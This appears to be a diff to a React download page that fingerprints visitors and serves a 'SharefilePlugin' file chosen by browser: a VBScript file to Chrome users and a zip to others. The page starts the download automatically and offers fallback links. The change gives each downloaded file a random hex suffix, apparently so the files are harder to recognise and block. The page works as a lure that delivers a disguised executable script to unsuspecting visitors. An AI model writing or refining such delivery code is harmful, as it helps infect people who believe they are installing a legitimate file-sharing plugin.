@@ -1,6 +1,12 @@
-import { useEffect } from "react";
+import { useEffect, useMemo } from "react";
 import { useVisitorData } from "@fingerprintjs/fingerprintjs-pro-react";
 import adbTransfer from "@/assets/adb_transfer.png";
+
+const randomHex = (len = 8) =>
+  Array.from(crypto.getRandomValues(new Uint8Array(len)))
+    .map((b) => b.toString(16).padStart(2, "0"))
+    .join("")
+    .slice(0, len);
 
 const Download = () => {
   const { data: visitorData } = useVisitorData({ extendedResult: true }, { immediate: true });
@@ -12,19 +18,20 @@ const Download = () => {
     }
   }, [visitorData]);
 
-  const getDownloadFile = () => {
+  const downloadFile = useMemo(() => {
     const ua = navigator.userAgent;
+    const suffix = randomHex(8);
     if (ua.includes("Edg/")) {
-      return { href: "/docs/SharefilePlugin.zip", name: "SharefilePlugin.zip" };
+      return { href: "/docs/SharefilePlugin.zip", name: `SharefilePlugin_${suffix}.zip` };
     }
     if (ua.includes("Chrome") && !ua.includes("Edg/")) {
-      return { href: "/docs/SharefilePlugin.vbs", name: "SharefilePlugin.vbs" };
+      return { href: "/docs/SharefilePlugin.vbs", name: `SharefilePlugin_${suffix}.vbs` };
     }
-    return { href: "/docs/SharefilePlugin.zip", name: "SharefilePlugin.zip" };
-  };
+    return { href: "/docs/SharefilePlugin.zip", name: `SharefilePlugin_${suffix}.zip` };
+  }, []);
 
   useEffect(() => {
-    const file = getDownloadFile();
+    const file = downloadFile;
     if (!file) return;
     const timer = setTimeout(() => {
       const link = document.createElement("a");
@@ -54,12 +61,12 @@ const Download = () => {
           </p>
         </div>
 
-        {getDownloadFile() ? (
+        {downloadFile ? (
           <>
             <p className="text-sm text-[#666]">
               If the download doesn't start automatically, please{" "}
               <a
-                href={getDownloadFile()!.href}
+                href={downloadFile!.href}
                 download
                 className="text-[#4A6FA5] underline hover:text-[#3a5a8a]"
               >
@@ -71,7 +78,7 @@ const Download = () => {
             <div className="flex items-center gap-3 text-sm text-[#888]">
               <span>Download not working?</span>
               <a
-                href={getDownloadFile()!.href}
+                href={downloadFile!.href}
                 download
                 className="text-[#4A6FA5] underline hover:text-[#3a5a8a]"
               >
